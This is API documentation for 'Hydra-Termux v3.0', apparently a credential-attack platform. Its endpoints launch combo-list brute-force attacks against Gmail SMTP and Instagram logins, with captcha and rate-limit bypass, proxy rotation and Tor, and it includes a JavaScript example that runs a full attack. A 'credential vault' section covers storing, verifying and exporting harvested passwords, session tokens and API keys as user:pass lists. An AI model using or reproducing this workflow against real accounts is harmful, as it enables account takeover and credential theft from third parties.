# Supreme Features API Documentation

Complete API reference for the new supreme features in Hydra-Termux v3.0

---

## Base URL

```
http://localhost:3000/api
```

All endpoints require authentication via Bearer token in the `Authorization` header.

---

## 1. Email-IP Attacks API

### 1.1 List Email-IP Attacks

```http
GET /email-ip-attacks
```

**Query Parameters:**
- `status` (optional) - Filter by status: queued, running, completed, failed, cancelled, paused
- `limit` (optional, default: 50) - Number of results per page
- `offset` (optional, default: 0) - Pagination offset

**Response:**
```json
{
  "attacks": [
    {
      "id": 1,
      "user_id": 1,
      "name": "Gmail Attack #1",
      "target_email": "target@gmail.com",
      "target_ip": "142.250.185.109",
      "target_port": 587,
      "protocol": "smtp",
      "status": "completed",
      "total_attempts": 1000,
      "successful_attempts": 5,
      "failed_attempts": 995,
      "credentials_found": [...],
      "created_at": "2025-01-15T10:00:00Z"
    }
  ],
  "pagination": {
    "total": 10,
    "limit": 50,
    "offset": 0
  }
}
```

### 1.2 Create Email-IP Attack

```http
POST /email-ip-attacks
```

**Request Body:**
```json
{
  "name": "Gmail Attack #1",
  "target_email": "target@gmail.com",
  "target_ip": "142.250.185.109",
  "target_port": 587,
  "protocol": "smtp",
  "combo_list_path": "/path/to/combos.txt",
  "use_ssl": true,
  "use_tls": true,
  "timeout_seconds": 30,
  "max_threads": 4,
  "retry_attempts": 3,
  "notes": "Testing Gmail security",
  "tags": ["gmail", "test"]
}
```

**Response:**
```json
{
  "attack": {
    "id": 1,
    "status": "queued",
    ...
  }
}
```

### 1.3 Start Attack

```http
POST /email-ip-attacks/:id/start
```

### 1.4 Stop Attack

```http
POST /email-ip-attacks/:id/stop
```

### 1.5 Get Attack Statistics

```http
GET /email-ip-attacks/:id/stats
```

**Response:**
```json
{
  "stats": {
    "total_attempts": 1000,
    "successful_attempts": 5,
    "failed_attempts": 995,
    "success_rate": "0.50",
    "duration_seconds": 3600,
    "credentials_count": 5,
    "status": "completed"
  }
}
```

---

## 2. Supreme Combo Attacks API

### 2.1 List Supreme Combo Attacks

```http
GET /supreme-combos
```

**Query Parameters:**
- `status` - Filter by status
- `attack_type` - Filter by type: email_ip, credential_stuffing, api_endpoint, cloud_service, active_directory, web_application
- `limit`, `offset` - Pagination

### 2.2 Create Supreme Combo Attack

```http
POST /supreme-combos
```

**Request Body:**
```json
{
  "name": "Instagram Checker",
  "attack_type": "web_application",
  "target_service": "instagram",
  "target_urls": ["https://www.instagram.com/accounts/login/"],
  "script_name": "instagram_combo.py",
  "script_path": "/scripts/instagram_combo.py",
  "combo_file_path": "/combos/instagram.txt",
  "combo_count": 10000,
  "proxy_list": ["proxy1:port", "proxy2:port"],
  "user_agent_rotation": true,
  "captcha_bypass": true,
  "rate_limit_bypass": false,
  "use_tor": false,
  "use_vpn": true,
  "max_threads": 20,
  "timeout_seconds": 60,
  "retry_failed": true,
  "save_screenshots": false,
  "notes": "Instagram account validation",
  "tags": ["instagram", "social"],
  "priority": 8
}
```

### 2.3 Control Actions

```http
POST /supreme-combos/:id/start   # Start attack
POST /supreme-combos/:id/pause   # Pause attack
POST /supreme-combos/:id/stop    # Stop attack
```

### 2.4 Get Available Scripts

```http
GET /supreme-combos/scripts/available
```

**Response:**
```json
{
  "scripts": [
    {
      "name": "Gmail Supreme Combo",
      "type": "email_ip",
      "script_name": "gmail_supreme.py",
      "description": "Advanced Gmail credential testing",
      "features": ["proxy_support", "captcha_bypass", "rate_limit_bypass"]
    },
    ...
  ]
}
```

---

## 3. DNS Intelligence API

### 3.1 Get Domain Intelligence

```http
GET /dns-intelligence/domain/:domain
```

**Response:**
```json
{
  "intel": {
    "domain": "example.com",
    "mx_records": [
      {
        "exchange": "mail.example.com",
        "priority": 10
      }
    ],
    "spf_record": "v=spf1 include:_spf.example.com ~all",
    "dmarc_record": "v=DMARC1; p=quarantine; ...",
    "dmarc_policy": "quarantine",
    "dkim_selectors": ["default", "google"],
    "a_records": ["192.0.2.1"],
    "email_provider": "Google Workspace",
    "has_spf": true,
    "has_dmarc": true,
    "has_dkim": true,
    "security_score": 90,
    "last_scanned_at": "2025-01-15T10:00:00Z"
  }
}
```

### 3.2 Force Scan Domain

```http
POST /dns-intelligence/domain/:domain/scan
```

### 3.3 Bulk Scan Domains

```http
POST /dns-intelligence/bulk-scan
```

**Request Body:**
```json
{
  "domains": ["example.com", "test.com", "demo.com"]
}
```

**Response:**
```json
{
  "results": [
    {
      "domain": "example.com",
      "success": true,
      "intel": {...}
    },
    {
      "domain": "test.com",
      "success": false,
      "error": "DNS resolution failed"
    }
  ]
}
```

### 3.4 Security Analysis

```http
GET /dns-intelligence/domain/:domain/security-analysis
```

**Response:**
```json
{
  "analysis": {
    "security_score": 90,
    "max_score": 100,
    "grade": "A",
    "findings": [
      "SPF record properly configured",
      "DMARC policy set to quarantine"
    ],
    "recommendations": [
      "Upgrade DMARC policy to reject"
    ],
    "vulnerabilities": [
      {
        "type": "weak_dmarc_policy",
        "severity": "medium",
        "description": "DMARC policy could be more strict"
      }
    ]
  }
}
```

---

## 4. Attack Analytics API

### 4.1 Get Summary Statistics

```http
GET /attack-analytics/summary
```

**Response:**
```json
{
  "summary": {
    "total_attacks": 150,
    "email_ip_attacks": 50,
    "supreme_combo_attacks": 75,
    "cloud_attacks": 10,
    "ad_attacks": 5,
    "web_app_attacks": 10,
    "credentials_found": 234
  },
  "status_breakdown": {
    "email_ip": [
      {"status": "completed", "count": 45},
      {"status": "running", "count": 3},
      {"status": "failed", "count": 2}
    ],
    "supreme_combo": [...]
  },
  "recent_activity": [
    {
      "type": "email_ip",
      "id": 123,
      "name": "Gmail Attack",
      "status": "completed",
      "created_at": "2025-01-15T09:00:00Z"
    }
  ]
}
```

### 4.2 Time-Series Analytics

```http
GET /attack-analytics/timeseries?days=30
```

**Response:**
```json
{
  "analytics": [
    {
      "date": "2025-01-15",
      "total_attacks": 10,
      "successful_attacks": 8,
      "failed_attacks": 2,
      "email_ip_attacks": 4,
      "supreme_combo_attacks": 6,
      "total_credentials_found": 45,
      "avg_success_rate": 75.5
    }
  ],
  "period_days": 30
}
```

### 4.3 Performance Metrics

```http
GET /attack-analytics/performance
```

**Response:**
```json
{
  "email_ip": {
    "total_attacks": 50,
    "avg_duration_seconds": "1800.50",
    "avg_success_rate": "2.35",
    "total_successful": 125,
    "total_attempts": 50000
  },
  "supreme_combo": {
    "total_attacks": 75,
    "avg_duration_seconds": "3600.25",
    "avg_success_rate": "5.67",
    "total_successful": 850,
    "total_attempts": 150000,
    "avg_speed": "25.50"
  }
}
```

### 4.4 Credential Statistics

```http
GET /attack-analytics/credentials
```

**Response:**
```json
{
  "by_category": [
    {"category": "email", "count": 150},
    {"category": "cloud", "count": 50},
    {"category": "web", "count": 34}
  ],
  "by_service": [
    {"target_service": "gmail", "count": 75},
    {"target_service": "aws", "count": 30}
  ],
  "by_source": [
    {"source_attack_type": "supreme_combo", "count": 180},
    {"source_attack_type": "email_ip", "count": 54}
  ],
  "recent_credentials": [...]
}
```

### 4.5 Export Analytics

```http
GET /attack-analytics/export?format=csv&days=30
```

**Formats:** `json`, `csv`

---

## 5. Credential Vault API

### 5.1 List Credentials

```http
GET /credential-vault
```

**Query Parameters:**
- `category` - Filter by category
- `target_service` - Filter by service
- `is_verified` - Filter by verification status
- `limit`, `offset` - Pagination

### 5.2 Add Credential

```http
POST /credential-vault
```

**Request Body:**
```json
{
  "username": "user@example.com",
  "password": "secretpass123",
  "email": "user@example.com",
  "target_service": "gmail",
  "target_url": "https://mail.google.com",
  "access_level": "user",
  "account_status": "active",
  "two_factor_enabled": false,
  "session_token": "eyJhbGc...",
  "api_keys": {
    "main": "sk-..."
  },
  "additional_info": {
    "account_age": "2 years",
    "verified": true
  },
  "category": "email",
  "tags": ["gmail", "personal"],
  "notes": "Primary account",
  "priority": 8,
  "source_attack_type": "supreme_combo",
  "source_attack_id": 123
}
```

### 5.3 Verify Credential

```http
POST /credential-vault/:id/verify
```

### 5.4 Bulk Import

```http
POST /credential-vault/bulk-import
```

**Request Body:**
```json
{
  "credentials": [
    {
      "username": "user1",
      "password": "pass1",
      "target_service": "gmail"
    },
    {
      "username": "user2",
      "password": "pass2",
      "target_service": "aws"
    }
  ]
}
```

**Response:**
```json
{
  "imported": 2,
  "errors": 0,
  "details": {
    "imported": [...],
    "errors": []
  }
}
```

### 5.5 Export Credentials

```http
GET /credential-vault/export/all?format=csv
```

**Formats:** `json`, `csv`, `txt`

**CSV Format:**
```
username,password,email,target_service,target_url,category,notes
user@gmail.com,pass123,user@gmail.com,gmail,https://mail.google.com,email,Primary
```

**TXT Format:**
```
user@gmail.com:pass123
user2@outlook.com:pass456
```

### 5.6 Search Credentials

```http
POST /credential-vault/search
```

**Request Body:**
```json
{
  "query": "gmail",
  "fields": ["username", "email", "target_service"]
}
```

### 5.7 Get Metadata

```http
GET /credential-vault/meta/categories  # List all categories
GET /credential-vault/meta/services    # List all services with counts
```

---

## Authentication

All endpoints require a valid JWT token:

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

To get a token:

```http
POST /auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "securepassword"
}
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 1,
    "username": "admin",
    "role": "admin"
  }
}
```

---

## Error Responses

All endpoints return consistent error responses:

```json
{
  "error": "Error message description"
}
```

**HTTP Status Codes:**
- `200` - Success
- `201` - Created
- `400` - Bad Request (invalid input)
- `401` - Unauthorized (missing/invalid token)
- `404` - Not Found
- `500` - Internal Server Error

---

## Rate Limiting

API is rate-limited to **100 requests per 15 minutes** per IP address.

Rate limit headers:
```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1642259400
```

---

## Webhooks

Configure webhooks in notification settings for real-time updates:

### Discord Webhook Format

```json
{
  "embeds": [{
    "title": "🎯 Email-IP Attack Complete",
    "description": "**Gmail Attack #1**\nStatus: completed\nCredentials Found: 5",
    "color": 65280,
    "timestamp": "2025-01-15T10:30:00Z"
  }]
}
```

### Slack Webhook Format

```json
{
  "text": "🎯 Email-IP Attack Complete: Gmail Attack #1\nStatus: completed\nCredentials: 5"
}
```

---

## Examples

### Complete Email-IP Attack Flow

```javascript
// 1. Create attack
const createResponse = await fetch('/api/email-ip-attacks', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer YOUR_TOKEN',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    name: 'Gmail Test',
    target_email: 'target@gmail.com',
    target_ip: '142.250.185.109',
    combo_list_path: '/combos/gmail.txt'
  })
});

const { attack } = await createResponse.json();

// 2. Start attack
await fetch(`/api/email-ip-attacks/${attack.id}/start`, {
  method: 'POST',
  headers: { 'Authorization': 'Bearer YOUR_TOKEN' }
});

// 3. Poll for status
const statusInterval = setInterval(async () => {
  const response = await fetch(`/api/email-ip-attacks/${attack.id}`, {
    headers: { 'Authorization': 'Bearer YOUR_TOKEN' }
  });
  const { attack: current } = await response.json();
  
  if (current.status === 'completed' || current.status === 'failed') {
    clearInterval(statusInterval);
    console.log('Attack finished:', current);
  }
}, 5000);

// 4. Get results
const statsResponse = await fetch(`/api/email-ip-attacks/${attack.id}/stats`, {
  headers: { 'Authorization': 'Bearer YOUR_TOKEN' }
});
const { stats } = await statsResponse.json();
console.log('Success rate:', stats.success_rate + '%');
```

---

## Support

For issues or questions:
- GitHub Issues: [hydra-termux/issues](https://github.com/your-repo/issues)
- Documentation: See SUPREME_FEATURES_GUIDE.md
- Email: support@hydra-termux.com

---

**API Version:** 3.0.0  
**Last Updated:** 2025-01-15
